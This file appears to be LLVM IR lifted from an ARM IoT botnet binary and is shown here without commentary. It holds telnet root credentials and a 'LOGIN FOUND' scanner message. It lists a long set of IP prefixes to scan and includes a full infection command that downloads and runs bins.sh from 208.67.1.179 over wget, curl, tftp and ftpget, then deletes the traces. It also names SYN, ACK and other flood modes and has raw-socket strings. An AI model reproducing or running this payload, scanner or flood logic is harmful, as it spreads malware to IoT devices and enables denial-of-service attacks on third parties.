source_filename = "test"
target datalayout = "e-p:32:32:32-f80:32:32"

@r0 = internal unnamed_addr global i32 0
@r1 = internal unnamed_addr global i32 0
@r2 = internal unnamed_addr global i32 0
@r3 = internal unnamed_addr global i32 0
@r4 = internal unnamed_addr global i32 0
@r5 = internal unnamed_addr global i32 0
@r6 = internal unnamed_addr global i32 0
@r7 = internal unnamed_addr global i32 0
@r8 = internal unnamed_addr global i32 0
@sb = internal unnamed_addr global i32 0
@sl = internal unnamed_addr global i32 0
@fp = internal unnamed_addr global i32 0
@ip = internal unnamed_addr global i32 0
@sp = internal unnamed_addr global i32 0
@lr = internal unnamed_addr global i32 0
@cpsr_n = internal unnamed_addr global i1 false
@cpsr_z = internal unnamed_addr global i1 false
@cpsr_c = internal unnamed_addr global i1 false
@cpsr_v = internal unnamed_addr global i1 false
@0 = external global i32
@global_var_2a00c.13 = global i32 0
@global_var_11df8.17 = constant i32 -509558771
@global_var_2a54c.20 = global i32 0
@global_var_2a550.21 = local_unnamed_addr global i32 0
@global_var_2a554.22 = local_unnamed_addr global i32 0
@global_var_2a2ac.25 = local_unnamed_addr global i32 4095
@global_var_2a2a8.28 = global i32 362436
@global_var_1ea58.30 = constant [7 x i8] c"(null)\00"
@global_var_2e54c.32 = local_unnamed_addr global i32 0
@global_var_1ea60.34 = constant [8 x i8] c"/bin/sh\00"
@global_var_1e6a8.36 = constant [3 x i8] c"sh\00"
@global_var_1ea68.38 = constant [3 x i8] c"-c\00"
@global_var_1ea6c.41 = constant i32 -1
@global_var_1ee6c.43 = constant [14 x i8] c"/proc/cpuinfo\00"
@global_var_1ee7c.45 = constant [9 x i8] c"BOGOMIPS\00"
@global_var_2a530.50 = global i32 0
@global_var_1ee88.52 = constant [5 x i8] c"PING\00"
@global_var_1ea48.54 = constant [8 x i8] c"busybox\00"
@global_var_1ea50.55 = constant i32 36
@global_var_1ea54.56 = constant i32 35
@global_var_2a26c.57 = global [3 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1ea48.54, i32 0, i32 0), i8* bitcast (i32* @global_var_1ea50.55 to i8*), i8* bitcast (i32* @global_var_1ea54.56 to i8*)]
@global_var_1ea10.59 = constant [7 x i8] c"nvalid\00"
@global_var_1ea18.60 = constant [6 x i8] c"ailed\00"
@global_var_1ea20.61 = constant [9 x i8] c"ncorrect\00"
@global_var_1ea2c.62 = constant [6 x i8] c"enied\00"
@global_var_1ea34.63 = constant [5 x i8] c"rror\00"
@global_var_1ea3c.64 = constant [7 x i8] c"oodbye\00"
@global_var_1ea44.65 = constant [4 x i8] c"bad\00"
@global_var_2a24c.66 = global [7 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1ea10.59, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1ea18.60, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1ea20.61, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1ea2c.62, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1ea34.63, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1ea3c.64, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1ea44.65, i32 0, i32 0)]
@global_var_2a538.68 = global i32 0
@global_var_2a53c.69 = local_unnamed_addr global i32 0
@global_var_30798.71 = global i32 0
@global_var_1ee90.73 = constant [6 x i8] c":>%$#\00"
@global_var_2a546.75 = global i32 0
@global_var_2a547.76 = local_unnamed_addr global i32 0
@global_var_2a548.77 = local_unnamed_addr global i32 0
@global_var_1ee98.83 = constant [12 x i8] c"112.5.%d.%d\00"
@global_var_1eea4.85 = constant [14 x i8] c"117.165.%d.%d\00"
@global_var_1eeb4.87 = constant [11 x i8] c"85.3.%d.%d\00"
@global_var_1eec0.89 = constant [13 x i8] c"37.158.%d.%d\00"
@global_var_1eed0.91 = constant [11 x i8] c"95.9.%d.%d\00"
@global_var_1eedc.93 = constant [13 x i8] c"41.252.%d.%d\00"
@global_var_1eeec.95 = constant [12 x i8] c"58.71.%d.%d\00"
@global_var_1eef8.97 = constant [13 x i8] c"104.55.%d.%d\00"
@global_var_1ef08.99 = constant [13 x i8] c"78.186.%d.%d\00"
@global_var_1ef18.101 = constant [13 x i8] c"78.189.%d.%d\00"
@global_var_1ef28.103 = constant [14 x i8] c"221.120.%d.%d\00"
@global_var_1ef38.105 = constant [11 x i8] c"88.5.%d.%d\00"
@global_var_1ef44.107 = constant [13 x i8] c"41.254.%d.%d\00"
@global_var_1ef54.109 = constant [13 x i8] c"103.20.%d.%d\00"
@global_var_1ef64.111 = constant [13 x i8] c"103.47.%d.%d\00"
@global_var_1ef74.113 = constant [13 x i8] c"103.57.%d.%d\00"
@global_var_1ef84.115 = constant [13 x i8] c"45.117.%d.%d\00"
@global_var_1ef94.117 = constant [13 x i8] c"101.51.%d.%d\00"
@global_var_1efa4.119 = constant [13 x i8] c"137.59.%d.%d\00"
@global_var_1efb4.121 = constant [11 x i8] c"1.56.%d.%d\00"
@global_var_1efc0.123 = constant [12 x i8] c"1.188.%d.%d\00"
@global_var_1efcc.125 = constant [13 x i8] c"14.204.%d.%d\00"
@global_var_1efdc.127 = constant [11 x i8] c"27.0.%d.%d\00"
@global_var_1efe8.129 = constant [11 x i8] c"27.8.%d.%d\00"
@global_var_1eff4.131 = constant [12 x i8] c"27.50.%d.%d\00"
@global_var_1f000.133 = constant [12 x i8] c"27.54.%d.%d\00"
@global_var_1f00c.135 = constant [12 x i8] c"27.98.%d.%d\00"
@global_var_1f018.137 = constant [13 x i8] c"27.112.%d.%d\00"
@global_var_1f028.139 = constant [13 x i8] c"27.192.%d.%d\00"
@global_var_1f038.141 = constant [12 x i8] c"36.32.%d.%d\00"
@global_var_1f044.143 = constant [13 x i8] c"36.248.%d.%d\00"
@global_var_1f054.145 = constant [12 x i8] c"39.64.%d.%d\00"
@global_var_1f060.147 = constant [11 x i8] c"42.4.%d.%d\00"
@global_var_1f06c.149 = constant [12 x i8] c"42.48.%d.%d\00"
@global_var_1f078.151 = constant [12 x i8] c"42.52.%d.%d\00"
@global_var_1f084.153 = constant [12 x i8] c"42.56.%d.%d\00"
@global_var_1f090.155 = constant [12 x i8] c"42.63.%d.%d\00"
@global_var_1f09c.157 = constant [12 x i8] c"42.84.%d.%d\00"
@global_var_1f0a8.159 = constant [13 x i8] c"42.176.%d.%d\00"
@global_var_1f0b8.161 = constant [13 x i8] c"42.224.%d.%d\00"
@global_var_1f0c8.163 = constant [13 x i8] c"43.253.%d.%d\00"
@global_var_1f0d8.165 = constant [13 x i8] c"43.230.%d.%d\00"
@global_var_1f0e8.167 = constant [13 x i8] c"163.53.%d.%d\00"
@global_var_1f0f8.169 = constant [13 x i8] c"62.252.%d.%d\00"
@global_var_1f108.171 = constant [13 x i8] c"43.245.%d.%d\00"
@global_var_1f118.173 = constant [13 x i8] c"62.255.%d.%d\00"
@global_var_1f128.175 = constant [13 x i8] c"123.25.%d.%d\00"
@global_var_1f138.177 = constant [13 x i8] c"103.54.%d.%d\00"
@global_var_1f148.179 = constant [13 x i8] c"27.255.%d.%d\00"
@global_var_1f158.181 = constant [14 x i8] c"103.204.%d.%d\00"
@global_var_1f168.183 = constant [13 x i8] c"123.24.%d.%d\00"
@global_var_1f178.185 = constant [14 x i8] c"113.191.%d.%d\00"
@global_var_1f188.187 = constant [13 x i8] c"81.100.%d.%d\00"
@global_var_1f198.189 = constant [14 x i8] c"113.188.%d.%d\00"
@global_var_1f1a8.191 = constant [14 x i8] c"113.189.%d.%d\00"
@global_var_1f1b8.193 = constant [13 x i8] c"94.174.%d.%d\00"
@global_var_1f1c8.195 = constant [13 x i8] c"14.160.%d.%d\00"
@global_var_1f1d8.197 = constant [13 x i8] c"14.161.%d.%d\00"
@global_var_1f1e8.199 = constant [13 x i8] c"14.162.%d.%d\00"
@global_var_1f1f8.201 = constant [13 x i8] c"14.163.%d.%d\00"
@global_var_1f208.203 = constant [13 x i8] c"14.164.%d.%d\00"
@global_var_1f218.205 = constant [13 x i8] c"14.165.%d.%d\00"
@global_var_1f228.207 = constant [13 x i8] c"14.166.%d.%d\00"
@global_var_1f238.209 = constant [13 x i8] c"14.167.%d.%d\00"
@global_var_1f248.211 = constant [13 x i8] c"14.168.%d.%d\00"
@global_var_1f258.213 = constant [13 x i8] c"14.169.%d.%d\00"
@global_var_1f268.215 = constant [13 x i8] c"14.170.%d.%d\00"
@global_var_1f278.217 = constant [13 x i8] c"14.171.%d.%d\00"
@global_var_1f288.219 = constant [13 x i8] c"14.172.%d.%d\00"
@global_var_1f298.222 = constant [13 x i8] c"14.173.%d.%d\00"
@global_var_1f2a8.224 = constant [13 x i8] c"14.174.%d.%d\00"
@global_var_1f2b8.226 = constant [13 x i8] c"14.175.%d.%d\00"
@global_var_1f2c8.228 = constant [13 x i8] c"14.176.%d.%d\00"
@global_var_1f2d8.230 = constant [13 x i8] c"14.177.%d.%d\00"
@global_var_1f2e8.232 = constant [13 x i8] c"14.178.%d.%d\00"
@global_var_1f2f8.234 = constant [13 x i8] c"14.179.%d.%d\00"
@global_var_1f308.236 = constant [13 x i8] c"14.180.%d.%d\00"
@global_var_1f318.238 = constant [13 x i8] c"14.181.%d.%d\00"
@global_var_1f328.240 = constant [13 x i8] c"14.182.%d.%d\00"
@global_var_1f338.242 = constant [13 x i8] c"14.183.%d.%d\00"
@global_var_1f348.244 = constant [13 x i8] c"14.184.%d.%d\00"
@global_var_1f358.246 = constant [13 x i8] c"14.185.%d.%d\00"
@global_var_1f368.248 = constant [13 x i8] c"14.186.%d.%d\00"
@global_var_1f378.250 = constant [13 x i8] c"14.187.%d.%d\00"
@global_var_1f388.252 = constant [13 x i8] c"14.188.%d.%d\00"
@global_var_1f398.254 = constant [13 x i8] c"14.189.%d.%d\00"
@global_var_1f3a8.256 = constant [13 x i8] c"14.190.%d.%d\00"
@global_var_1f3b8.258 = constant [13 x i8] c"14.191.%d.%d\00"
@global_var_1f3c8.260 = constant [13 x i8] c"45.121.%d.%d\00"
@global_var_1f3d8.262 = constant [13 x i8] c"45.120.%d.%d\00"
@global_var_1f3e8.264 = constant [13 x i8] c"45.115.%d.%d\00"
@global_var_1f3f8.266 = constant [13 x i8] c"43.252.%d.%d\00"
@global_var_1f408.268 = constant [13 x i8] c"43.240.%d.%d\00"
@global_var_1f418.270 = constant [13 x i8] c"41.174.%d.%d\00"
@global_var_1f428.272 = constant [13 x i8] c"49.118.%d.%d\00"
@global_var_1f438.274 = constant [13 x i8] c"78.188.%d.%d\00"
@global_var_1f448.276 = constant [13 x i8] c"45.127.%d.%d\00"
@global_var_1f458.278 = constant [13 x i8] c"103.30.%d.%d\00"
@global_var_1f468.280 = constant [12 x i8] c"14.33.%d.%d\00"
@global_var_1f474.282 = constant [13 x i8] c"123.16.%d.%d\00"
@global_var_1f484.284 = constant [13 x i8] c"202.44.%d.%d\00"
@global_var_1f494.286 = constant [13 x i8] c"116.93.%d.%d\00"
@global_var_1f4a4.288 = constant [12 x i8] c"91.83.%d.%d\00"
@global_var_1f4b0.290 = constant [13 x i8] c"41.253.%d.%d\00"
@global_var_1f4c0.292 = constant [14 x i8] c"117.173.%d.%d\00"
@global_var_1f4d0.294 = constant [14 x i8] c"113.190.%d.%d\00"
@global_var_1f4e0.296 = constant [13 x i8] c"146.88.%d.%d\00"
@global_var_1f4f0.298 = constant [14 x i8] c"112.196.%d.%d\00"
@global_var_1f500.300 = constant [14 x i8] c"113.178.%d.%d\00"
@global_var_1f510.302 = constant [13 x i8] c"112.45.%d.%d\00"
@global_var_1f520.304 = constant [14 x i8] c"183.223.%d.%d\00"
@global_var_1f530.306 = constant [13 x i8] c"116.71.%d.%d\00"
@global_var_1f540.308 = constant [13 x i8] c"103.44.%d.%d\00"
@global_var_1f550.310 = constant [14 x i8] c"110.235.%d.%d\00"
@global_var_1f560.312 = constant [14 x i8] c"124.253.%d.%d\00"
@global_var_1f570.314 = constant [14 x i8] c"211.237.%d.%d\00"
@global_var_1f580.316 = constant [14 x i8] c"117.175.%d.%d\00"
@global_var_1f590.318 = constant [13 x i8] c"178.93.%d.%d\00"
@global_var_1f5a0.320 = constant [12 x i8] c"111.9.%d.%d\00"
@global_var_1f5ac.322 = constant [14 x i8] c"222.252.%d.%d\00"
@global_var_1f5bc.324 = constant [14 x i8] c"113.174.%d.%d\00"
@global_var_1f5cc.326 = constant [14 x i8] c"113.160.%d.%d\00"
@global_var_1f5dc.328 = constant [14 x i8] c"113.161.%d.%d\00"
@global_var_1f5ec.330 = constant [14 x i8] c"113.162.%d.%d\00"
@global_var_1f5fc.332 = constant [14 x i8] c"113.163.%d.%d\00"
@global_var_1f60c.334 = constant [14 x i8] c"113.164.%d.%d\00"
@global_var_1f61c.336 = constant [14 x i8] c"113.165.%d.%d\00"
@global_var_1f62c.338 = constant [14 x i8] c"113.166.%d.%d\00"
@global_var_1f63c.340 = constant [14 x i8] c"113.167.%d.%d\00"
@global_var_1f64c.342 = constant [14 x i8] c"113.168.%d.%d\00"
@global_var_1f65c.344 = constant [14 x i8] c"113.169.%d.%d\00"
@global_var_1f66c.346 = constant [13 x i8] c"123.17.%d.%d\00"
@global_var_1f67c.348 = constant [13 x i8] c"123.18.%d.%d\00"
@global_var_1f68c.350 = constant [13 x i8] c"123.19.%d.%d\00"
@global_var_1f69c.352 = constant [13 x i8] c"123.20.%d.%d\00"
@global_var_1f6ac.354 = constant [13 x i8] c"123.21.%d.%d\00"
@global_var_1f6bc.356 = constant [13 x i8] c"123.22.%d.%d\00"
@global_var_1f6cc.358 = constant [14 x i8] c"222.253.%d.%d\00"
@global_var_1f6dc.360 = constant [14 x i8] c"222.254.%d.%d\00"
@global_var_1f6ec.362 = constant [14 x i8] c"222.255.%d.%d\00"
@global_var_1f6fc.364 = constant [13 x i8] c"37.247.%d.%d\00"
@global_var_1f70c.366 = constant [13 x i8] c"41.208.%d.%d\00"
@global_var_1f71c.369 = constant [14 x i8] c"183.220.%d.%d\00"
@global_var_1f72c.371 = constant [14 x i8] c"175.201.%d.%d\00"
@global_var_1f73c.373 = constant [14 x i8] c"103.198.%d.%d\00"
@global_var_1f74c.376 = constant [13 x i8] c"50.205.%d.%d\00"
@global_var_1f75c.378 = constant [13 x i8] c"88.248.%d.%d\00"
@global_var_1f76c.380 = constant [13 x i8] c"88.105.%d.%d\00"
@global_var_1f77c.382 = constant [13 x i8] c"88.247.%d.%d\00"
@global_var_1f78c.384 = constant [13 x i8] c"85.105.%d.%d\00"
@global_var_1f79c.386 = constant [12 x i8] c"188.3.%d.%d\00"
@global_var_1f7a8.388 = constant [14 x i8] c"103.203.%d.%d\00"
@global_var_1f7b8.390 = constant [13 x i8] c"103.55.%d.%d\00"
@global_var_1f7c8.392 = constant [14 x i8] c"103.220.%d.%d\00"
@global_var_1f7d8.394 = constant [14 x i8] c"183.233.%d.%d\00"
@global_var_1f7e8.396 = constant [14 x i8] c"103.242.%d.%d\00"
@global_var_1f7f8.398 = constant [13 x i8] c"103.14.%d.%d\00"
@global_var_1f808.400 = constant [14 x i8] c"103.195.%d.%d\00"
@global_var_1f818.402 = constant [14 x i8] c"103.214.%d.%d\00"
@global_var_1f828.404 = constant [14 x i8] c"103.218.%d.%d\00"
@global_var_1f838.406 = constant [14 x i8] c"103.225.%d.%d\00"
@global_var_1f848.408 = constant [14 x i8] c"103.228.%d.%d\00"
@global_var_1f858.410 = constant [14 x i8] c"103.231.%d.%d\00"
@global_var_1f868.412 = constant [13 x i8] c"103.60.%d.%d\00"
@global_var_1f878.414 = constant [14 x i8] c"103.248.%d.%d\00"
@global_var_1f888.416 = constant [14 x i8] c"103.253.%d.%d\00"
@global_var_1f898.418 = constant [14 x i8] c"103.255.%d.%d\00"
@global_var_1f8a8.420 = constant [13 x i8] c"103.35.%d.%d\00"
@global_var_1f8b8.422 = constant [13 x i8] c"103.49.%d.%d\00"
@global_var_1f8c8.424 = constant [13 x i8] c"103.62.%d.%d\00"
@global_var_1f8d8.426 = constant [13 x i8] c"144.48.%d.%d\00"
@global_var_1f8e8.428 = constant [13 x i8] c"163.47.%d.%d\00"
@global_var_1f8f8.431 = constant [13 x i8] c"223.29.%d.%d\00"
@global_var_1f908.433 = constant [13 x i8] c"59.153.%d.%d\00"
@global_var_1f918.435 = constant [14 x i8] c"113.176.%d.%d\00"
@global_var_1f928.437 = constant [14 x i8] c"113.175.%d.%d\00"
@global_var_1f938.439 = constant [14 x i8] c"113.177.%d.%d\00"
@global_var_1f948.441 = constant [14 x i8] c"113.183.%d.%d\00"
@global_var_1f958.443 = constant [14 x i8] c"202.164.%d.%d\00"
@global_var_1f968.445 = constant [14 x i8] c"203.134.%d.%d\00"
@global_var_1f978.447 = constant [13 x i8] c"210.56.%d.%d\00"
@global_var_1f988.449 = constant [13 x i8] c"49.156.%d.%d\00"
@global_var_1f998.451 = constant [14 x i8] c"203.210.%d.%d\00"
@global_var_1f9a8.453 = constant [14 x i8] c"117.181.%d.%d\00"
@global_var_1f9b8.455 = constant [14 x i8] c"117.178.%d.%d\00"
@global_var_1f9c8.457 = constant [14 x i8] c"117.177.%d.%d\00"
@global_var_1f9d8.459 = constant [14 x i8] c"117.176.%d.%d\00"
@global_var_1f9e8.461 = constant [14 x i8] c"117.170.%d.%d\00"
@global_var_1f9f8.463 = constant [14 x i8] c"117.171.%d.%d\00"
@global_var_1fa08.465 = constant [14 x i8] c"117.162.%d.%d\00"
@global_var_1fa18.467 = constant [13 x i8] c"112.26.%d.%d\00"
@global_var_1fa28.469 = constant [13 x i8] c"112.27.%d.%d\00"
@global_var_1fa38.471 = constant [13 x i8] c"112.28.%d.%d\00"
@global_var_1fa48.473 = constant [13 x i8] c"112.29.%d.%d\00"
@global_var_1fa58.475 = constant [13 x i8] c"112.30.%d.%d\00"
@global_var_1fa68.477 = constant [13 x i8] c"112.31.%d.%d\00"
@global_var_1fa78.479 = constant [14 x i8] c"203.150.%d.%d\00"
@global_var_1fa88.481 = constant [13 x i8] c"50.233.%d.%d\00"
@global_var_3078c.483 = global i32 0
@global_var_1e994.485 = constant [15 x i8] c"/dev/netslink/\00"
@global_var_1e9a4.486 = constant [6 x i8] c"/tmp/\00"
@global_var_1e9ac.487 = constant [6 x i8] c"/var/\00"
@global_var_1e9b4.488 = constant [6 x i8] c"/dev/\00"
@global_var_1e9bc.489 = constant [10 x i8] c"/var/run/\00"
@global_var_1e9c8.490 = constant [10 x i8] c"/dev/shm/\00"
@global_var_1e9d4.491 = constant [6 x i8] c"/mnt/\00"
@global_var_1e9dc.492 = constant [7 x i8] c"/boot/\00"
@global_var_1e9e4.493 = constant [6 x i8] c"/usr/\00"
@global_var_1e9ec.494 = constant [6 x i8] c"/opt/\00"
@global_var_2a20c.495 = global [10 x i8*] [i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_1e994.485, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1e9a4.486, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1e9ac.487, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1e9b4.488, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1e9bc.489, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1e9c8.490, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1e9d4.491, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1e9dc.492, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1e9e4.493, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1e9ec.494, i32 0, i32 0)]
@global_var_2a238 = external global i32
@global_var_1e980.502 = constant [5 x i8] c"root\00"
@global_var_1e988.503 = constant [7 x i8] c"telnet\00"
@global_var_1e990.504 = constant i32 0
@global_var_2a1f4.505 = global [6 x i8*] [i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1e980.502, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1e980.502, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1e988.503, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1e980.502, i32 0, i32 0), i8* bitcast (i32* @global_var_1e990.504 to i8*), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1e988.503, i32 0, i32 0)]
@global_var_1fa98.507 = constant [3 x i8] c"\0D\0A\00"
@global_var_2a200.509 = global [3 x i8*] [i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1e980.502, i32 0, i32 0), i8* bitcast (i32* @global_var_1e990.504 to i8*), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1e988.503, i32 0, i32 0)]
@global_var_2a27c.511 = global [10 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1ea10.59, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1ea18.60, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1ea20.61, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1ea2c.62, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1ea34.63, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1ea3c.64, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1ea44.65, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1ea48.54, i32 0, i32 0), i8* bitcast (i32* @global_var_1ea50.55 to i8*), i8* bitcast (i32* @global_var_1ea54.56 to i8*)]
@global_var_1fa9c.514 = constant [23 x i8] c"LOGIN FOUND - %s:%s:%s\00"
@global_var_1fab4.516 = constant [5 x i8] c"sh\0D\0A\00"
@global_var_1fabc.518 = constant [8 x i8] c"shell\0D\0A\00"
@global_var_1e7d0.520 = constant [430 x i8] c" cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://208.67.1.179/bins.sh; curl -O http://208.67.1.179/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 208.67.1.179 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 208.67.1.179; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 208.67.1.179 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *\0D\0A\00"
@global_var_2a1f0.521 = local_unnamed_addr global [430 x i8]* @global_var_1e7d0.520
@global_var_1fac4.523 = constant [6 x i8] c"arfgG\00"
@global_var_1facc.524 = constant [9 x i8] c"HBiug655\00"
@global_var_1fad8.525 = constant [13 x i8] c"KJYDFyljf754\00"
@global_var_1fae8.526 = constant [20 x i8] c"LIKUGilkut769458905\00"
@global_var_1fafc.527 = constant [17 x i8] c"JHFDSkgfc5747694\00"
@global_var_1fb10.528 = constant [12 x i8] c"GJjyur67458\00"
@global_var_1fb1c.529 = constant [12 x i8] c"RYSDk747586\00"
@global_var_1fb28.530 = constant [12 x i8] c"HKJGi5r8675\00"
@global_var_1fb34.531 = constant [10 x i8] c"KHGK7985i\00"
@global_var_1fb40.532 = constant [11 x i8] c"yuituiILYF\00"
@global_var_1fb4c.533 = constant [14 x i8] c"GKJDghfcjkgd4\00"
@global_var_1fb5c.534 = constant [12 x i8] c"uygtfgtrevf\00"
@global_var_1fb68.535 = constant [13 x i8] c"tyeuhygbtfvg\00"
@global_var_1fb78.536 = constant [9 x i8] c"ewqdcftr\00"
@global_var_1fb84.537 = constant [16 x i8] c"trbazetghhnbrty\00"
@global_var_1fb94.538 = constant [11 x i8] c"tbhrwsehbg\00"
@global_var_1fba0.539 = constant [12 x i8] c"twehgbferhb\00"
@global_var_1fbac.540 = constant [12 x i8] c"etrbhhgetrb\00"
@global_var_1fbb8.541 = constant [14 x i8] c"edfverthbyrtb\00"
@global_var_1fbc8.542 = constant [14 x i8] c"kmiujmnhnhfgn\00"
@global_var_1fbd8.543 = constant [14 x i8] c"zcdbvgdfsbgfd\00"
@global_var_1fbe8.544 = constant [10 x i8] c"gdfbtsdgb\00"
@global_var_1fbf4.545 = constant [14 x i8] c"ghdugffytsdyt\00"
@global_var_1fc04.546 = constant [14 x i8] c"tgerthgwtrwry\00"
@global_var_1fc14.547 = constant [12 x i8] c"yteytietyue\00"
@global_var_1fc20.548 = constant [9 x i8] c"qsortEQS\00"
@global_var_1fc2c.549 = constant [16 x i8] c"8969876hjkghblk\00"
@global_var_1fc3c.550 = constant [4 x i8] c"std\00"
@global_var_1fc40.551 = constant [4 x i8] c"dts\00"
@global_var_1fc44.552 = constant [4 x i8] c"lsk\00"
@global_var_1fc48.553 = constant [4 x i8] c"kek\00"
@global_var_1fc4c.554 = constant [6 x i8] c"smack\00"
@global_var_1fc54.555 = constant [4 x i8] c"ily\00"
@global_var_1fc58.556 = constant [4 x i8] c"tyf\00"
@global_var_1fc5c.557 = constant [4 x i8] c"pos\00"
@global_var_1fc60.558 = constant [6 x i8] c"cunts\00"
@global_var_1fc68.559 = constant [36 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1fac4.523, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1facc.524, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1fad8.525, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @global_var_1fae8.526, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_1fafc.527, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1fb10.528, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1fb1c.529, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1fb28.530, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1fb34.531, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1fb40.532, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1fb4c.533, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1fb5c.534, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1fb68.535, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1fb78.536, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_1fb84.537, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1fb94.538, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1fba0.539, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1fbac.540, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1fbb8.541, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1fbc8.542, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1fbd8.543, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1fbe8.544, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1fbf4.545, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1fc04.546, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1fc14.547, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1fc20.548, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_1fc2c.549, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1fc3c.550, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1fc40.551, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1fc44.552, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1fc48.553, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1fc4c.554, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1fc54.555, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1fc58.556, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1fc5c.557, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1fc60.558, i32 0, i32 0)]
@global_var_1fcf8.563 = constant [27 x i8] c"Failed opening raw socket.\00"
@global_var_1fd14.565 = constant [33 x i8] c"Failed setting raw headers mode.\00"
@global_var_1fd38.570 = constant [4 x i8] c"all\00"
@global_var_1fd3c.572 = constant i32 44
@global_var_1fd40.574 = constant [4 x i8] c"syn\00"
@global_var_1fd44.576 = constant [4 x i8] c"rst\00"
@global_var_1fd48.578 = constant [4 x i8] c"fin\00"
@global_var_1fd4c.580 = constant [4 x i8] c"ack\00"
@global_var_1fd50.582 = constant [4 x i8] c"psh\00"
